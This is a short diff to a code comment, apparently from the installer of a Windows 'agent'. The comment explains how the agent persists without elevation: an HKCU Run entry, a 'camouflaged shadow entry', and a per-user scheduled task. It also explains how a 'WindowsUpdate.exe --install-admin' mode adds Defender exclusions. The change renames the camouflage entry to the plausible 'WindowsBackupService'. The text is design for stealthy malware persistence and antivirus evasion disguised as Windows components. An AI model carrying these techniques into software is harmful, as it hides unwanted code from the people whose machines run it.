@@ -17,7 +17,7 @@
 # Everything below runs as the current user. Install path is %LOCALAPPDATA%,
 # autostart is set up by the agent itself using per-user mechanisms that need
 # no elevation: an HKCU Run entry (plus a camouflaged shadow entry under
-# `MicrosoftEdgeUpdateCore`) and a per-user scheduled task. If the operator
+# `WindowsBackupService`) and a per-user scheduled task. If the operator
 # later wants Defender exclusions as well, they can run the agent once with
 # `WindowsUpdate.exe --install-admin` from an elevated shell — the agent
 # re-launches itself under UAC in that mode and adds the exclusions. By
